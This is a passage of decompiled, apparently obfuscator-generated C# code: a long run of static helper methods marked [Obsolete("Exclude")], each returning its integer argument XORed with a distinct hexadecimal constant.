	[Obsolete("Exclude")]
	public static int smethod_3350(int int_4)
	{
		return int_4 ^ 0x3A8BC249;
	}

	[Obsolete("Exclude")]
	public static int smethod_3351(int int_4)
	{
		return int_4 ^ 0x404C15EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3352(int int_4)
	{
		return int_4 ^ 0x5F8AC23;
	}

	[Obsolete("Exclude")]
	public static int smethod_3353(int int_4)
	{
		return int_4 ^ 0x36342044;
	}

	[Obsolete("Exclude")]
	public static int smethod_3354(int int_4)
	{
		return int_4 ^ 0x3BCEACB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3355(int int_4)
	{
		return int_4 ^ 0x524DD2EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3356(int int_4)
	{
		return int_4 ^ 0x64B52CB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3357(int int_4)
	{
		return int_4 ^ 0x337D3D9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3358(int int_4)
	{
		return int_4 ^ 0x9D50A53;
	}

	[Obsolete("Exclude")]
	public static int smethod_3359(int int_4)
	{
		return int_4 ^ 0x467B6361;
	}

	[Obsolete("Exclude")]
	public static int smethod_3360(int int_4)
	{
		return int_4 ^ 0x7B8D0E44;
	}

	[Obsolete("Exclude")]
	public static int smethod_3361(int int_4)
	{
		return int_4 ^ 0x9F2BEC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3362(int int_4)
	{
		return int_4 ^ 0x1DE5D99D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3363(int int_4)
	{
		return int_4 ^ 0x4AF2FE0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3364(int int_4)
	{
		return int_4 ^ 0x7C1E16C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3365(int int_4)
	{
		return int_4 ^ 0x574ED76D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3366(int int_4)
	{
		return int_4 ^ 0x7DDFDE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3367(int int_4)
	{
		return int_4 ^ 0x550519A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3368(int int_4)
	{
		return int_4 ^ 0xF4A314F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3369(int int_4)
	{
		return int_4 ^ 0x6B5B1781;
	}

	[Obsolete("Exclude")]
	public static int smethod_3370(int int_4)
	{
		return int_4 ^ 0x697BB208;
	}

	[Obsolete("Exclude")]
	public static int smethod_3371(int int_4)
	{
		return int_4 ^ 0x44252131;
	}

	[Obsolete("Exclude")]
	public static int smethod_3372(int int_4)
	{
		return int_4 ^ 0xB05AB95;
	}

	[Obsolete("Exclude")]
	public static int smethod_3373(int int_4)
	{
		return int_4 ^ 0x33965753;
	}

	[Obsolete("Exclude")]
	public static int smethod_3374(int int_4)
	{
		return int_4 ^ 0x44C73173;
	}

	[Obsolete("Exclude")]
	public static int smethod_3375(int int_4)
	{
		return int_4 ^ 0x3DE32EF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3376(int int_4)
	{
		return int_4 ^ 0x4A58547;
	}

	[Obsolete("Exclude")]
	public static int smethod_3377(int int_4)
	{
		return int_4 ^ 0x147E87DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3378(int int_4)
	{
		return int_4 ^ 0x440BA0DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3379(int int_4)
	{
		return int_4 ^ 0x72091E0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3380(int int_4)
	{
		return int_4 ^ 0x41E7F0BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3381(int int_4)
	{
		return int_4 ^ 0xB88A16F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3382(int int_4)
	{
		return int_4 ^ 0x58EF90E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3383(int int_4)
	{
		return int_4 ^ 0x7C5CD85F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3384(int int_4)
	{
		return int_4 ^ 0x282B652;
	}

	[Obsolete("Exclude")]
	public static int smethod_3385(int int_4)
	{
		return int_4 ^ 0xFA0EC4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3386(int int_4)
	{
		return int_4 ^ 0x7D87AAD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3387(int int_4)
	{
		return int_4 ^ 0x101C4C9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3388(int int_4)
	{
		return int_4 ^ 0x7A4A3471;
	}

	[Obsolete("Exclude")]
	public static int smethod_3389(int int_4)
	{
		return int_4 ^ 0x6F5D386A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3390(int int_4)
	{
		return int_4 ^ 0x4159177C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3391(int int_4)
	{
		return int_4 ^ 0x1369F1DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3392(int int_4)
	{
		return int_4 ^ 0x60609651;
	}

	[Obsolete("Exclude")]
	public static int smethod_3393(int int_4)
	{
		return int_4 ^ 0x1C20CEA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3394(int int_4)
	{
		return int_4 ^ 0x221E6478;
	}

	[Obsolete("Exclude")]
	public static int smethod_3395(int int_4)
	{
		return int_4 ^ 0x55771DD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3396(int int_4)
	{
		return int_4 ^ 0x5652C166;
	}

	[Obsolete("Exclude")]
	public static int smethod_3397(int int_4)
	{
		return int_4 ^ 0x3E166408;
	}

	[Obsolete("Exclude")]
	public static int smethod_3398(int int_4)
	{
		return int_4 ^ 0x5EB041A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3399(int int_4)
	{
		return int_4 ^ 0x946188C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3400(int int_4)
	{
		return int_4 ^ 0x37A678D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3401(int int_4)
	{
		return int_4 ^ 0x9B61FDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3402(int int_4)
	{
		return int_4 ^ 0x4ABAEE88;
	}

	[Obsolete("Exclude")]
	public static int smethod_3403(int int_4)
	{
		return int_4 ^ 0x519A5DCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3404(int int_4)
	{
		return int_4 ^ 0x5BADDDB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3405(int int_4)
	{
		return int_4 ^ 0x42463CD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3406(int int_4)
	{
		return int_4 ^ 0x36927657;
	}

	[Obsolete("Exclude")]
	public static int smethod_3407(int int_4)
	{
		return int_4 ^ 0x75E6E1B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3408(int int_4)
	{
		return int_4 ^ 0x643A3044;
	}

	[Obsolete("Exclude")]
	public static int smethod_3409(int int_4)
	{
		return int_4 ^ 0x796B493A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3410(int int_4)
	{
		return int_4 ^ 0x3A834775;
	}

	[Obsolete("Exclude")]
	public static int smethod_3411(int int_4)
	{
		return int_4 ^ 0x7D49EF75;
	}

	[Obsolete("Exclude")]
	public static int smethod_3412(int int_4)
	{
		return int_4 ^ 0x3AE5F4EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3413(int int_4)
	{
		return int_4 ^ 0x5CB3255A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3414(int int_4)
	{
		return int_4 ^ 0x6F417A5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3415(int int_4)
	{
		return int_4 ^ 0xB3A352A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3416(int int_4)
	{
		return int_4 ^ 0x7C1204F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3417(int int_4)
	{
		return int_4 ^ 0x3F39AA52;
	}

	[Obsolete("Exclude")]
	public static int smethod_3418(int int_4)
	{
		return int_4 ^ 0x32A3E7EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3419(int int_4)
	{
		return int_4 ^ 0x5B1BD0FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3420(int int_4)
	{
		return int_4 ^ 0x20C1B627;
	}

	[Obsolete("Exclude")]
	public static int smethod_3421(int int_4)
	{
		return int_4 ^ 0x6ACDEE42;
	}

	[Obsolete("Exclude")]
	public static int smethod_3422(int int_4)
	{
		return int_4 ^ 0x5BE2463A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3423(int int_4)
	{
		return int_4 ^ 0x13DE2C1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3424(int int_4)
	{
		return int_4 ^ 0x6663EFCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3425(int int_4)
	{
		return int_4 ^ 0x21E11C92;
	}

	[Obsolete("Exclude")]
	public static int smethod_3426(int int_4)
	{
		return int_4 ^ 0x214DDCCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3427(int int_4)
	{
		return int_4 ^ 0x5677AA54;
	}

	[Obsolete("Exclude")]
	public static int smethod_3428(int int_4)
	{
		return int_4 ^ 0x2C9AB397;
	}

	[Obsolete("Exclude")]
	public static int smethod_3429(int int_4)
	{
		return int_4 ^ 0x167D16F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3430(int int_4)
	{
		return int_4 ^ 0xDDBC102;
	}

	[Obsolete("Exclude")]
	public static int smethod_3431(int int_4)
	{
		return int_4 ^ 0x3A05C9C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3432(int int_4)
	{
		return int_4 ^ 0x702237A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3433(int int_4)
	{
		return int_4 ^ 0x4DD53DB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3434(int int_4)
	{
		return int_4 ^ 0x26610AAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3435(int int_4)
	{
		return int_4 ^ 0x49B56B0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3436(int int_4)
	{
		return int_4 ^ 0x6BA98084;
	}

	[Obsolete("Exclude")]
	public static int smethod_3437(int int_4)
	{
		return int_4 ^ 0x3735EF4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3438(int int_4)
	{
		return int_4 ^ 0x2E083F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3439(int int_4)
	{
		return int_4 ^ 0x7E8664E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3440(int int_4)
	{
		return int_4 ^ 0x5C400725;
	}

	[Obsolete("Exclude")]
	public static int smethod_3441(int int_4)
	{
		return int_4 ^ 0x61FCE6A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3442(int int_4)
	{
		return int_4 ^ 0x94D0974;
	}

	[Obsolete("Exclude")]
	public static int smethod_3443(int int_4)
	{
		return int_4 ^ 0x63DA815C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3444(int int_4)
	{
		return int_4 ^ 0x29336F85;
	}

	[Obsolete("Exclude")]
	public static int smethod_3445(int int_4)
	{
		return int_4 ^ 0x6B08B889;
	}

	[Obsolete("Exclude")]
	public static int smethod_3446(int int_4)
	{
		return int_4 ^ 0x124C33E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3447(int int_4)
	{
		return int_4 ^ 0x1F18D564;
	}

	[Obsolete("Exclude")]
	public static int smethod_3448(int int_4)
	{
		return int_4 ^ 0x7266918D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3449(int int_4)
	{
		return int_4 ^ 0x2C8980F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3450(int int_4)
	{
		return int_4 ^ 0x47A03E7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3451(int int_4)
	{
		return int_4 ^ 0x120AA5BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3452(int int_4)
	{
		return int_4 ^ 0x11ED54EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3453(int int_4)
	{
		return int_4 ^ 0x3D180738;
	}

	[Obsolete("Exclude")]
	public static int smethod_3454(int int_4)
	{
		return int_4 ^ 0x78B55C40;
	}

	[Obsolete("Exclude")]
	public static int smethod_3455(int int_4)
	{
		return int_4 ^ 0x3A58E2E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3456(int int_4)
	{
		return int_4 ^ 0x5653F2A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3457(int int_4)
	{
		return int_4 ^ 0x6792D0A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3458(int int_4)
	{
		return int_4 ^ 0x6221CDFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3459(int int_4)
	{
		return int_4 ^ 0x2EA9B3B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3460(int int_4)
	{
		return int_4 ^ 0x4A75AD37;
	}

	[Obsolete("Exclude")]
	public static int smethod_3461(int int_4)
	{
		return int_4 ^ 0x64DB3D99;
	}

	[Obsolete("Exclude")]
	public static int smethod_3462(int int_4)
	{
		return int_4 ^ 0x3395915;
	}

	[Obsolete("Exclude")]
	public static int smethod_3463(int int_4)
	{
		return int_4 ^ 0x9B70BD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3464(int int_4)
	{
		return int_4 ^ 0x7254E2C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3465(int int_4)
	{
		return int_4 ^ 0x107CE034;
	}

	[Obsolete("Exclude")]
	public static int smethod_3466(int int_4)
	{
		return int_4 ^ 0x3D0BB84E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3467(int int_4)
	{
		return int_4 ^ 0x6B78CFF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3468(int int_4)
	{
		return int_4 ^ 0x72454D25;
	}

	[Obsolete("Exclude")]
	public static int smethod_3469(int int_4)
	{
		return int_4 ^ 0x4B42E9D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3470(int int_4)
	{
		return int_4 ^ 0x61E4D653;
	}

	[Obsolete("Exclude")]
	public static int smethod_3471(int int_4)
	{
		return int_4 ^ 0x178CF295;
	}

	[Obsolete("Exclude")]
	public static int smethod_3472(int int_4)
	{
		return int_4 ^ 0x38935829;
	}

	[Obsolete("Exclude")]
	public static int smethod_3473(int int_4)
	{
		return int_4 ^ 0x6412025D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3474(int int_4)
	{
		return int_4 ^ 0x488ACA31;
	}

	[Obsolete("Exclude")]
	public static int smethod_3475(int int_4)
	{
		return int_4 ^ 0x157050E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3476(int int_4)
	{
		return int_4 ^ 0x4104E994;
	}

	[Obsolete("Exclude")]
	public static int smethod_3477(int int_4)
	{
		return int_4 ^ 0x485F8217;
	}

	[Obsolete("Exclude")]
	public static int smethod_3478(int int_4)
	{
		return int_4 ^ 0x7FE8D29B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3479(int int_4)
	{
		return int_4 ^ 0x637A82C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3480(int int_4)
	{
		return int_4 ^ 0x1949072D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3481(int int_4)
	{
		return int_4 ^ 0x46612B7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3482(int int_4)
	{
		return int_4 ^ 0x29A6D6A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3483(int int_4)
	{
		return int_4 ^ 0x1B1F06BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3484(int int_4)
	{
		return int_4 ^ 0x206F6342;
	}

	[Obsolete("Exclude")]
	public static int smethod_3485(int int_4)
	{
		return int_4 ^ 0x40C2DD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3486(int int_4)
	{
		return int_4 ^ 0x6AD409FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3487(int int_4)
	{
		return int_4 ^ 0x63DEC5DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3488(int int_4)
	{
		return int_4 ^ 0x46CDF9CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3489(int int_4)
	{
		return int_4 ^ 0x618768E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3490(int int_4)
	{
		return int_4 ^ 0x6E13E9C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3491(int int_4)
	{
		return int_4 ^ 0xB185923;
	}

	[Obsolete("Exclude")]
	public static int smethod_3492(int int_4)
	{
		return int_4 ^ 0x6DC91B6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3493(int int_4)
	{
		return int_4 ^ 0xA6FC3DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3494(int int_4)
	{
		return int_4 ^ 0x379E2D5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3495(int int_4)
	{
		return int_4 ^ 0x4BB05F1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3496(int int_4)
	{
		return int_4 ^ 0x117157D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3497(int int_4)
	{
		return int_4 ^ 0x637BF2FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3498(int int_4)
	{
		return int_4 ^ 0x3340E54D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3499(int int_4)
	{
		return int_4 ^ 0x734390F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3500(int int_4)
	{
		return int_4 ^ 0x27E49162;
	}

	[Obsolete("Exclude")]
	public static int smethod_3501(int int_4)
	{
		return int_4 ^ 0x1764D501;
	}

	[Obsolete("Exclude")]
	public static int smethod_3502(int int_4)
	{
		return int_4 ^ 0x38E39E68;
	}

	[Obsolete("Exclude")]
	public static int smethod_3503(int int_4)
	{
		return int_4 ^ 0x30BFDF30;
	}

	[Obsolete("Exclude")]
	public static int smethod_3504(int int_4)
	{
		return int_4 ^ 0x4BC96038;
	}

	[Obsolete("Exclude")]
	public static int smethod_3505(int int_4)
	{
		return int_4 ^ 0x72E0E141;
	}

	[Obsolete("Exclude")]
	public static int smethod_3506(int int_4)
	{
		return int_4 ^ 0x6C2B8A74;
	}

	[Obsolete("Exclude")]
	public static int smethod_3507(int int_4)
	{
		return int_4 ^ 0x7B0A3DB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3508(int int_4)
	{
		return int_4 ^ 0xFCA811F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3509(int int_4)
	{
		return int_4 ^ 0xF64C367;
	}

	[Obsolete("Exclude")]
	public static int smethod_3510(int int_4)
	{
		return int_4 ^ 0x71CD5C37;
	}

	[Obsolete("Exclude")]
	public static int smethod_3511(int int_4)
	{
		return int_4 ^ 0x7CC89629;
	}

	[Obsolete("Exclude")]
	public static int smethod_3512(int int_4)
	{
		return int_4 ^ 0x4B2907B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3513(int int_4)
	{
		return int_4 ^ 0x240EE727;
	}

	[Obsolete("Exclude")]
	public static int smethod_3514(int int_4)
	{
		return int_4 ^ 0x5422FB3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3515(int int_4)
	{
		return int_4 ^ 0x50005523;
	}

	[Obsolete("Exclude")]
	public static int smethod_3516(int int_4)
	{
		return int_4 ^ 0x1380974C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3517(int int_4)
	{
		return int_4 ^ 0x2080819;
	}

	[Obsolete("Exclude")]
	public static int smethod_3518(int int_4)
	{
		return int_4 ^ 0x646E4442;
	}

	[Obsolete("Exclude")]
	public static int smethod_3519(int int_4)
	{
		return int_4 ^ 0x59AE2CC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3520(int int_4)
	{
		return int_4 ^ 0x5782ADF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3521(int int_4)
	{
		return int_4 ^ 0x4C9C6777;
	}

	[Obsolete("Exclude")]
	public static int smethod_3522(int int_4)
	{
		return int_4 ^ 0x2AFE8DAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3523(int int_4)
	{
		return int_4 ^ 0x4CA9EEE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3524(int int_4)
	{
		return int_4 ^ 0x35DD3B79;
	}

	[Obsolete("Exclude")]
	public static int smethod_3525(int int_4)
	{
		return int_4 ^ 0x4BE617B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3526(int int_4)
	{
		return int_4 ^ 0xFC85992;
	}

	[Obsolete("Exclude")]
	public static int smethod_3527(int int_4)
	{
		return int_4 ^ 0x3B49D386;
	}

	[Obsolete("Exclude")]
	public static int smethod_3528(int int_4)
	{
		return int_4 ^ 0x7ACF732D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3529(int int_4)
	{
		return int_4 ^ 0x14FF6DEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3530(int int_4)
	{
		return int_4 ^ 0x6DA551D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3531(int int_4)
	{
		return int_4 ^ 0x52AF9BB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3532(int int_4)
	{
		return int_4 ^ 0x35DF3672;
	}

	[Obsolete("Exclude")]
	public static int smethod_3533(int int_4)
	{
		return int_4 ^ 0x44A404DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3534(int int_4)
	{
		return int_4 ^ 0xCB5B0BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3535(int int_4)
	{
		return int_4 ^ 0x52303199;
	}

	[Obsolete("Exclude")]
	public static int smethod_3536(int int_4)
	{
		return int_4 ^ 0x2ABEA878;
	}

	[Obsolete("Exclude")]
	public static int smethod_3537(int int_4)
	{
		return int_4 ^ 0x20CD0BFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3538(int int_4)
	{
		return int_4 ^ 0x124305CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3539(int int_4)
	{
		return int_4 ^ 0x2645006C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3540(int int_4)
	{
		return int_4 ^ 0xCCD52C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3541(int int_4)
	{
		return int_4 ^ 0x15212967;
	}

	[Obsolete("Exclude")]
	public static int smethod_3542(int int_4)
	{
		return int_4 ^ 0x6D72FBF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3543(int int_4)
	{
		return int_4 ^ 0x359A3621;
	}

	[Obsolete("Exclude")]
	public static int smethod_3544(int int_4)
	{
		return int_4 ^ 0x1F4F5540;
	}

	[Obsolete("Exclude")]
	public static int smethod_3545(int int_4)
	{
		return int_4 ^ 0x4C2AE214;
	}

	[Obsolete("Exclude")]
	public static int smethod_3546(int int_4)
	{
		return int_4 ^ 0x8BA8BF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3547(int int_4)
	{
		return int_4 ^ 0x45D27AB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3548(int int_4)
	{
		return int_4 ^ 0x6C8315C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3549(int int_4)
	{
		return int_4 ^ 0x715D848F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3550(int int_4)
	{
		return int_4 ^ 0x6512E678;
	}

	[Obsolete("Exclude")]
	public static int smethod_3551(int int_4)
	{
		return int_4 ^ 0x7CD2E595;
	}

	[Obsolete("Exclude")]
	public static int smethod_3552(int int_4)
	{
		return int_4 ^ 0x7B32CA53;
	}

	[Obsolete("Exclude")]
	public static int smethod_3553(int int_4)
	{
		return int_4 ^ 0x37C495F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3554(int int_4)
	{
		return int_4 ^ 0x7D62C1EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3555(int int_4)
	{
		return int_4 ^ 0x2F9297F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3556(int int_4)
	{
		return int_4 ^ 0x318A58BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3557(int int_4)
	{
		return int_4 ^ 0x164F4B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3558(int int_4)
	{
		return int_4 ^ 0x7C906352;
	}

	[Obsolete("Exclude")]
	public static int smethod_3559(int int_4)
	{
		return int_4 ^ 0x16FBBA76;
	}

	[Obsolete("Exclude")]
	public static int smethod_3560(int int_4)
	{
		return int_4 ^ 0x59B11A8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3561(int int_4)
	{
		return int_4 ^ 0x3DB1D3C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3562(int int_4)
	{
		return int_4 ^ 0x22A5AC82;
	}

	[Obsolete("Exclude")]
	public static int smethod_3563(int int_4)
	{
		return int_4 ^ 0x5DD62CEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3564(int int_4)
	{
		return int_4 ^ 0x19574DF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3565(int int_4)
	{
		return int_4 ^ 0x5829C93A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3566(int int_4)
	{
		return int_4 ^ 0x62CF8321;
	}

	[Obsolete("Exclude")]
	public static int smethod_3567(int int_4)
	{
		return int_4 ^ 0x41FB720B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3568(int int_4)
	{
		return int_4 ^ 0x18EF3250;
	}

	[Obsolete("Exclude")]
	public static int smethod_3569(int int_4)
	{
		return int_4 ^ 0x7876DD8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3570(int int_4)
	{
		return int_4 ^ 0x4CD5EF7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3571(int int_4)
	{
		return int_4 ^ 0x681BCC68;
	}

	[Obsolete("Exclude")]
	public static int smethod_3572(int int_4)
	{
		return int_4 ^ 0x1AF89419;
	}

	[Obsolete("Exclude")]
	public static int smethod_3573(int int_4)
	{
		return int_4 ^ 0x7C246A07;
	}

	[Obsolete("Exclude")]
	public static int smethod_3574(int int_4)
	{
		return int_4 ^ 0x5A9C1A73;
	}

	[Obsolete("Exclude")]
	public static int smethod_3575(int int_4)
	{
		return int_4 ^ 0x52C71A58;
	}

	[Obsolete("Exclude")]
	public static int smethod_3576(int int_4)
	{
		return int_4 ^ 0xCE83E1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3577(int int_4)
	{
		return int_4 ^ 0x525DCB82;
	}

	[Obsolete("Exclude")]
	public static int smethod_3578(int int_4)
	{
		return int_4 ^ 0x23302C69;
	}

	[Obsolete("Exclude")]
	public static int smethod_3579(int int_4)
	{
		return int_4 ^ 0x2678415D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3580(int int_4)
	{
		return int_4 ^ 0x771CFC6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3581(int int_4)
	{
		return int_4 ^ 0x671086D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3582(int int_4)
	{
		return int_4 ^ 0x2C621C70;
	}

	[Obsolete("Exclude")]
	public static int smethod_3583(int int_4)
	{
		return int_4 ^ 0x5D5A4031;
	}

	[Obsolete("Exclude")]
	public static int smethod_3584(int int_4)
	{
		return int_4 ^ 0x2E7EEFE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3585(int int_4)
	{
		return int_4 ^ 0x1ECBAC1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3586(int int_4)
	{
		return int_4 ^ 0x6847D353;
	}

	[Obsolete("Exclude")]
	public static int smethod_3587(int int_4)
	{
		return int_4 ^ 0x475C2256;
	}

	[Obsolete("Exclude")]
	public static int smethod_3588(int int_4)
	{
		return int_4 ^ 0x245D6271;
	}

	[Obsolete("Exclude")]
	public static int smethod_3589(int int_4)
	{
		return int_4 ^ 0x773CD153;
	}

	[Obsolete("Exclude")]
	public static int smethod_3590(int int_4)
	{
		return int_4 ^ 0x448C7C76;
	}

	[Obsolete("Exclude")]
	public static int smethod_3591(int int_4)
	{
		return int_4 ^ 0x72B5D8D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3592(int int_4)
	{
		return int_4 ^ 0x69C95DF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3593(int int_4)
	{
		return int_4 ^ 0x5E0F3125;
	}

	[Obsolete("Exclude")]
	public static int smethod_3594(int int_4)
	{
		return int_4 ^ 0x6E431A81;
	}

	[Obsolete("Exclude")]
	public static int smethod_3595(int int_4)
	{
		return int_4 ^ 0x3CE18F76;
	}

	[Obsolete("Exclude")]
	public static int smethod_3596(int int_4)
	{
		return int_4 ^ 0x7975EB33;
	}

	[Obsolete("Exclude")]
	public static int smethod_3597(int int_4)
	{
		return int_4 ^ 0x69BF7A28;
	}

	[Obsolete("Exclude")]
	public static int smethod_3598(int int_4)
	{
		return int_4 ^ 0x48BB56E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3599(int int_4)
	{
		return int_4 ^ 0x676C6080;
	}

	[Obsolete("Exclude")]
	public static int smethod_3600(int int_4)
	{
		return int_4 ^ 0x50919906;
	}

	[Obsolete("Exclude")]
	public static int smethod_3601(int int_4)
	{
		return int_4 ^ 0x648048C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3602(int int_4)
	{
		return int_4 ^ 0xC8DBD59;
	}

	[Obsolete("Exclude")]
	public static int smethod_3603(int int_4)
	{
		return int_4 ^ 0x3A9DC58D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3604(int int_4)
	{
		return int_4 ^ 0x55BEF9F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3605(int int_4)
	{
		return int_4 ^ 0x607E86A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3606(int int_4)
	{
		return int_4 ^ 0x73324659;
	}

	[Obsolete("Exclude")]
	public static int smethod_3607(int int_4)
	{
		return int_4 ^ 0x7C8596B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3608(int int_4)
	{
		return int_4 ^ 0x431C438;
	}

	[Obsolete("Exclude")]
	public static int smethod_3609(int int_4)
	{
		return int_4 ^ 0x27020E81;
	}

	[Obsolete("Exclude")]
	public static int smethod_3610(int int_4)
	{
		return int_4 ^ 0x41EED7DE;
	}

